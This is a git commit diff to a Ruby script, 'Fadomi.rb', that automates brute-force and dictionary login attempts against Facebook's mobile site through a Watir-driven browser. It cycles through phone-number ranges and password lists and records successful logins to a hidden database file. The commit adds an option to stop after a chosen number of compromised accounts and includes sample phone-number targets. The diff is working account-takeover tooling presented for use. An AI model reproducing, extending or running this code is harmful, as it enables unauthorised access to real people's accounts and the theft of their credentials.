195e055c277f828cfe92ae830f92c6c393a0f409
Magdy M. Ibrahim <sakafa_magdy@yahoo.com>
2017-03-02 12:43:02 -0500

    Add files via upload

--- Fadomi.rb
+++ Fadomi.rb
@@ -1,5 +1,4 @@
 #!/bin/ruby
-
 trap("SIGINT") { throw :ctrl_c }
 catch :ctrl_c do
 begin
@@ -14,13 +13,14 @@ begin
 	puts '                       CODED BY MAGDY MOUSTAFA                    '
 	puts ''
 	def help
-		puts "|[	-dbs => show database successful logins "
+		puts "|[	-db => show database successful logins "
 		puts "|[	-m1 , --mode1 => bruteforce in range"
 		    puts "|[	-m1+ , --mode1+ => dictionary attack on username and password from the same list"
 		puts "|[	-m2 , --mode2 => dictionary attack on username with password list"
-		puts "|[	usage. ruby Fadomi.rb [ option ] [ parameter 1 ] [ parameter 2 ]"
+		puts "|[	-ttf , --targets-to-find => set the numbers of targets to find ( Optional ) "
+		puts "|[	usage. ruby Fadomi.rb [ option ] [ parameter 1 ] [ parameter 2 ] ... "
 		puts "|[	eg. ruby Fadomi.rb -db"
-		puts "|[	eg. ruby Fadomi.rb -m1 01061031400 01061031500 "
+		puts "|[	eg. ruby Fadomi.rb -m1 01061031400 01061031500 -ttf 3 "
 		    puts "|[	eg. ruby Fadomi.rb -m1+ phone_numbers_list.txt "
 		puts "|[	eg. ruby Fadomi.rb --mode2 ashgan11 password_list.txt" 
 		exit
@@ -53,14 +53,15 @@ begin
 	table = Terminal::Table.new :headings => [ "Target" , "Password " , "Task Information" ], :rows => rows , :style => {:width => 60 }
 	table.style = { :padding_left => 3, :border_x => "=", :border_i => "x"}
 	puts table
-
+	
+	@v=0
+	@ttf = ARGV[4].to_i
 	def browserr ( b1 , b2 )
 		@browser.text_field( :name => 'email' ).set b1
 		    @browser.text_field( :name => 'pass' ).set b2
 		    @browser.button( :name => 'login' ).click
 		    sleep 2
 		    if @browser.text_field( :name => 'email' ).exists? == false || @browser.text_field( :name => 'pass' ).exists? == false || @browser.button( :name => 'login' ).exists? == false
-		
 		            rows2 = []
 		            rows2 << [ b1 , b2  , "[+] Succeed To Login" ]
 		            table2 = Terminal::Table.new :rows => rows2 , :style => {:width => 60 }
@@ -69,9 +70,15 @@ begin
 			open('.database.txt', 'a') { |f|
 	 			 f.puts table2
 			}
-
+			if ARGV[3] == "-ttf" || ARGV[3] == "--ttf" || ARGV[3] == "--targets-to-find"
+	        		@v=@v+1
+        			if @v.to_i > @ttf || @v.to_i == @ttf
+		                        @browser.close
+                			exit
+        			end
+			end
 		    	@browser.close
-		    	@browser = Watir::Browser.new :firefox
+		    	@browser = Watir::Browser.new
 		    	@browser.goto "https://m.facebook.com"
 		    else
 		            rows2 = []
